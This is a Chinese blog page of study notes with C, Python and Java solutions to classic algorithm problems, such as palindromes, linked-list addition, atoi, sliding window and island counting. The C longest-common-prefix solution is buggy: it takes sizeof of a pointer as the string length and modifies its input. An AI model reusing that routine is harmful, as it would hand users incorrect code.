          <a href="#回文数" class="heading-link"><i class="fas fa-link"></i></a><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h2>
      <p>挨个计算其模<code>10</code>的余数，打造回文数，判断与原数是否相等</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num = x;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( num != <span class="number">0</span>)&#123;</span><br><span class="line">        cur = cur*<span class="number">10</span> + num%<span class="number">10</span>;</span><br><span class="line">        num /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cur == x)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="最长公共前缀"   >
          <a href="#最长公共前缀" class="heading-link"><i class="fas fa-link"></i></a><a href="#最长公共前缀" class="headerlink" title="最长公共前缀"></a>最长公共前缀</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221012215550610.png" alt="image-20221012215550610"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">longestCommonPrefix</span><span class="params">(<span class="keyword">char</span> ** strs, <span class="keyword">int</span> strsSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strsSize == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span> ; j &lt; strsSize ; j ++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">sizeof</span>(strs[j]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span>* ans = strs[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">char</span>* com = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="keyword">sizeof</span>(ans); i ++)&#123;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span> ; j &lt; strsSize ; j ++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans[i] == strs[j][i])&#123;</span><br><span class="line">                flag += <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == strsSize)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            len = flag;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans[len] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="两数相加"   >
          <a href="#两数相加" class="heading-link"><i class="fas fa-link"></i></a><a href="#两数相加" class="headerlink" title="两数相加"></a>两数相加</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220911184123445.png" alt="image-20220911184123445"></p>
<p>进位计算，通过<code>carry = sum / 10;</code>来获取进位，<code>sum = sum % 10;</code>获取进位之后的值，然后用头节点依次串联起来，注意写的时候不要用局部变量当作返回结点，而是再分配一块内存来当作返回结点变量，不然会出错，可能是局部变量被覆盖之类的吧。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/add-two-numbers/solution/hua-jie-suan-fa-2-liang-shu-xiang-jia-by-guanpengc/" >画解算法：2. 两数相加 - 两数相加 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">headNode</span> =</span> (struct ListNode*)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">curNode</span> =</span> headNode;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(l1 != <span class="literal">NULL</span> || l2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> x = l1 == <span class="literal">NULL</span> ? <span class="number">0</span> : l1-&gt;val;</span><br><span class="line">        <span class="keyword">int</span> y = l2 == <span class="literal">NULL</span> ? <span class="number">0</span> : l2-&gt;val;</span><br><span class="line">        sum = x + y + carry;</span><br><span class="line">        carry = sum / <span class="number">10</span>;</span><br><span class="line">        sum = sum % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        curNode-&gt;next = (struct ListNode*) <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        curNode-&gt;next-&gt;val = sum;</span><br><span class="line">        curNode-&gt;next-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        curNode = curNode-&gt;next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l1 != <span class="literal">NULL</span>)</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(l2 != <span class="literal">NULL</span>)</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(carry == <span class="number">1</span>)&#123;</span><br><span class="line">        curNode-&gt;next = (struct ListNode*)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        curNode-&gt;next-&gt;val = carry;</span><br><span class="line">        curNode-&gt;next-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headNode-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="字符串转整数"   >
          <a href="#字符串转整数" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符串转整数" class="headerlink" title="字符串转整数"></a>字符串转整数</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220912124644320.png" alt="image-20220912124644320"></p>
<p>自动机</p>
<p>依据每个状态进行转换，即确定所有状态，已经该状态的下个状态都有什么，这里就是如下所示的表格</p>
<div class="table-container"><table>
<thead>
<tr>
<th></th>
<th>空格</th>
<th>符号+/-</th>
<th>数字</th>
<th>其他符号</th>
</tr>
</thead>
<tbody><tr>
<td>start</td>
<td>start</td>
<td>signed</td>
<td>in_number</td>
<td>end</td>
</tr>
<tr>
<td>signed</td>
<td>end</td>
<td>end</td>
<td>in_number</td>
<td>end</td>
</tr>
<tr>
<td>in_number</td>
<td>end</td>
<td>end</td>
<td>in_number</td>
<td>end</td>
</tr>
<tr>
<td>end</td>
<td>end</td>
<td>end</td>
<td>end</td>
<td>end</td>
</tr>
</tbody></table></div>
<p>同时编程时设定</p>
<ul>
<li><p>状态<code>state</code>：<code>start</code>，<code>signed</code>，<code>in_number</code>，<code>end</code></p>
</li>
<li><p>值<code>ans</code>：获取到的数字的值</p>
</li>
<li><p>符号<code>sign</code>：<code>1</code>为正数、<code>-1</code>为负数</p>
</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">INT_MAX = <span class="number">2</span> ** <span class="number">31</span> - <span class="number">1</span></span><br><span class="line">INT_MIN = -<span class="number">2</span> ** <span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Automaton</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.state = <span class="string">&#x27;start&#x27;</span></span><br><span class="line">        self.sign = <span class="number">1</span></span><br><span class="line">        self.ans = <span class="number">0</span></span><br><span class="line">        self.table = &#123;</span><br><span class="line">            <span class="string">&#x27;start&#x27;</span>: [<span class="string">&#x27;start&#x27;</span>, <span class="string">&#x27;signed&#x27;</span>, <span class="string">&#x27;in_number&#x27;</span>, <span class="string">&#x27;end&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;signed&#x27;</span>: [<span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;in_number&#x27;</span>, <span class="string">&#x27;end&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;in_number&#x27;</span>: [<span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;in_number&#x27;</span>, <span class="string">&#x27;end&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;end&#x27;</span>: [<span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>],</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_col</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="keyword">if</span> c.isspace():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;+&#x27;</span> <span class="keyword">or</span> c == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> c.isdigit():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        self.state = self.table[self.state][self.get_col(c)]</span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">&#x27;in_number&#x27;</span>:</span><br><span class="line">            self.ans = self.ans * <span class="number">10</span> + <span class="built_in">int</span>(c)</span><br><span class="line">            self.ans = <span class="built_in">min</span>(self.ans, INT_MAX) <span class="keyword">if</span> self.sign == <span class="number">1</span> <span class="keyword">else</span> <span class="built_in">min</span>(self.ans, -INT_MIN)</span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">&#x27;signed&#x27;</span>:</span><br><span class="line">            self.sign = <span class="number">1</span> <span class="keyword">if</span> c == <span class="string">&#x27;+&#x27;</span> <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span>(<span class="params">self, <span class="built_in">str</span>: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        automaton = Automaton()</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            automaton.get(c)</span><br><span class="line">        <span class="keyword">return</span> automaton.sign * automaton.ans</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>








        <h2 id="最长回文子串"   >
          <a href="#最长回文子串" class="heading-link"><i class="fas fa-link"></i></a><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a>最长回文子串</h2>
      
        <h3 id="中心扩散法"   >
          <a href="#中心扩散法" class="heading-link"><i class="fas fa-link"></i></a><a href="#中心扩散法" class="headerlink" title="中心扩散法"></a>中心扩散法</h3>
      
        <h3 id="动态规划"   >
          <a href="#动态规划" class="heading-link"><i class="fas fa-link"></i></a><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3>
      <p>首先明确一个字符串，如果首尾两个字符相同，并且去掉这两个字符后的字符串还是回文字符串，那么这个字符串即为回文字符串。</p>
<p><code>abcba</code> -&gt; 去掉首尾<code>aa</code> -&gt; <code>bcb</code>还是回文字符串，那么该字符串<code>abcba</code>即为回文字符串，这样就可以由大化小。</p>

        <h4 id="状态设定"   >
          <a href="#状态设定" class="heading-link"><i class="fas fa-link"></i></a><a href="#状态设定" class="headerlink" title="状态设定"></a>状态设定</h4>
      <p>首先定义一个二维数组状态<code>dp[i][j]</code>即为<code>str[i:j]</code>，若其值<code>dp[i][j]</code>为<code>True</code>，则代表子字符串<code>str[i:j]</code>为回文字符串。然后确定最开始的状态表，即最小的元素<code>dp[i][i]</code></p>
<div class="table-container"><table>
<thead>
<tr>
<th>i\j</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>..</th>
<th>n</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>True</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td></td>
<td>True</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td></td>
<td></td>
<td>True</td>
<td></td>
<td></td>
</tr>
<tr>
<td>..</td>
<td></td>
<td></td>
<td></td>
<td>True</td>
<td></td>
</tr>
<tr>
<td>n</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>True</td>
</tr>
</tbody></table></div>
<p>一个字符的子字符串一定为<code>True</code>，然后依据这个来判断外面的字符串是否为回文字符串。</p>

        <h4 id="状态转换方程"   >
          <a href="#状态转换方程" class="heading-link"><i class="fas fa-link"></i></a><a href="#状态转换方程" class="headerlink" title="状态转换方程"></a>状态转换方程</h4>
      <p>由上可得，对应子字符串<code>str[i:j]</code>为回文字符串的必要条件为字符串<code>str[i+1:j-1]</code>为回文字符串，那么即可从小状态<code>dp[i+1][j-1]</code>赋值给大状态<code>dp[i][j]</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="built_in">str</span>[j]):</span><br><span class="line">	dp[i][j] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>]</span><br></pre></td></tr></table></div></figure>

<p>那么定义完成边界之后，就可以进行相关代码编写了</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">myStr = <span class="string">&quot;cbdsgfsdaadsas&quot;</span></span><br><span class="line">myLen = <span class="built_in">len</span>(myStr)</span><br><span class="line">dp = [[<span class="literal">False</span>] * myLen <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(myLen)]</span><br><span class="line">max_len = <span class="number">1</span></span><br><span class="line">begin = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(myLen):</span><br><span class="line">    dp[i][i] = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> L <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,myLen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(myLen):</span><br><span class="line">        j = i + L - <span class="number">1</span></span><br><span class="line">        <span class="comment">#设定最大右边界</span></span><br><span class="line">        <span class="keyword">if</span>( j &gt;= myLen):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(myStr[i] != myStr[j]):</span><br><span class="line">            dp[i][j] = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> j-i &lt; <span class="number">3</span> :</span><br><span class="line">                dp[i][j] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i][j] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span>(dp[i][j] <span class="keyword">and</span> L &gt; max_len):</span><br><span class="line">            max_len = L</span><br><span class="line">            begin = i</span><br><span class="line"><span class="built_in">print</span>(myStr[begin:begin+max_len])</span><br></pre></td></tr></table></div></figure>


        <h2 id="无重复字符的最长子串"   >
          <a href="#无重复字符的最长子串" class="heading-link"><i class="fas fa-link"></i></a><a href="#无重复字符的最长子串" class="headerlink" title="无重复字符的最长子串"></a>无重复字符的最长子串</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141117639.png" alt="image-20220914111707372"></p>

        <h3 id="滑动窗口"   >
          <a href="#滑动窗口" class="heading-link"><i class="fas fa-link"></i></a><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h3>
      <p>比如一个字符串<code>str</code>为<code>pwwkew</code>，首先从<code>str[0]</code>开始创建一个队列<code>queue</code>，其中元素为<code>str[0]</code></p>
<ul>
<li>将<code>str[1]</code>加入队列，满足无重复要求</li>
<li>之后将<code>str[2]</code>加入队列，发现不满足要求，记录此时的字符串长度为<code>L</code>，记下起始位置<code>i</code>并且和<code>max_len</code>对比取大值。</li>
<li>这时将队首元素<code>str[0]</code>移出队列，发现还是不满足要求，再将新的队首元素<code>str[1]</code>移出队列，发现满足要求了，接着循环</li>
<li>将<code>str[3]</code>加入队列，满足要求，依次循环</li>
</ul>
<p>每一步大概如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209140930864.png" alt="123"></p>
<p>在加入队列不满足要求的时候记录此时的其实位置<code>i</code>和字符串长度<code>L</code>来取值比较即可</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Set&lt;Character&gt; queue = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">int</span> rightPoint = <span class="number">0</span>, max_len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> L = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++)&#123;</span><br><span class="line">            <span class="keyword">while</span> (  (rightPoint &lt; n) &amp;&amp; !queue.contains(s.charAt(rightPoint)))&#123;</span><br><span class="line">                queue.add(s.charAt(rightPoint));</span><br><span class="line">                rightPoint++;</span><br><span class="line">            &#125;</span><br><span class="line">            L = rightPoint-i;</span><br><span class="line">            <span class="keyword">if</span>(L &gt; max_len)&#123;</span><br><span class="line">                max_len = L;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(rightPoint &lt; n -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    queue.remove(s.charAt(<span class="number">0</span>));</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    queue.remove(s.charAt(i));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> max_len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_len;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="岛屿数量"   >
          <a href="#岛屿数量" class="heading-link"><i class="fas fa-link"></i></a><a href="#岛屿数量" class="headerlink" title="岛屿数量"></a>岛屿数量</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141118246.png" alt="image-20220914111803102"></p>

        <h3 id="深度优先搜索DFS"   >
          <a href="#深度优先搜索DFS" class="heading-link"><i class="fas fa-link"></i></a><a href="#深度优先搜索DFS" class="headerlink" title="深度优先搜索DFS"></a>深度优先搜索DFS</h3>
      <p>类似如下所示，遍历顺序为黄-&gt;紫-&gt;红-&gt;绿-&gt;蓝</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141201011.png" alt="DFS"></p>
<p>即依据一个结点，从该结点的上下左右往外扩散遍历所有结点，遇到一个结点就进去遍历，核心思想是发现结点，先进再说。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numIslands</span>(<span class="params">self, grid: [[<span class="built_in">str</span>]]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">grid,i,j</span>):</span></span><br><span class="line">            <span class="comment">#表示该结点已经遍历过了</span></span><br><span class="line">            grid[i][j] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>((i-<span class="number">1</span> &gt;= <span class="number">0</span>) <span class="keyword">and</span> grid[i-<span class="number">1</span>][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                dfs(grid,i-<span class="number">1</span>,j)</span><br><span class="line">            <span class="keyword">if</span>((i+<span class="number">1</span> &lt; <span class="built_in">len</span>(grid)) <span class="keyword">and</span> grid[i+<span class="number">1</span>][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                dfs(grid,i+<span class="number">1</span>,j)</span><br><span class="line">            <span class="keyword">if</span>((j-<span class="number">1</span> &gt;= <span class="number">0</span>) <span class="keyword">and</span> grid[i][j-<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                dfs(grid,i,j-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span>((j+<span class="number">1</span> &lt; <span class="built_in">len</span>(grid[<span class="number">0</span>])) <span class="keyword">and</span> grid[i][j+<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                dfs(grid,i,j+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(grid)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(grid[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                    dfs(grid,i,j)</span><br><span class="line">                    count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></div></figure>


        <h3 id="广度优先搜索BFS"   >
          <a href="#广度优先搜索BFS" class="heading-link"><i class="fas fa-link"></i></a><a href="#广度优先搜索BFS" class="headerlink" title="广度优先搜索BFS"></a>广度优先搜索BFS</h3>
      <p>类似如下所示，遍历顺序同样为黄-&gt;紫-&gt;红-&gt;绿-&gt;蓝，相当于是一层一层的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141357212.png" alt="BFS"></p>
<p>但是这样就需要用到一个队列，从一个结点出发的下一层都放到该队列尾部，然后从队首取结点，再遍历，将该结点的下一层也放入队列尾部，依次循环。</p>
<p>有点像将一个结点的出口点全面存储起来放到一个队列的最后一起进行遍历</p>
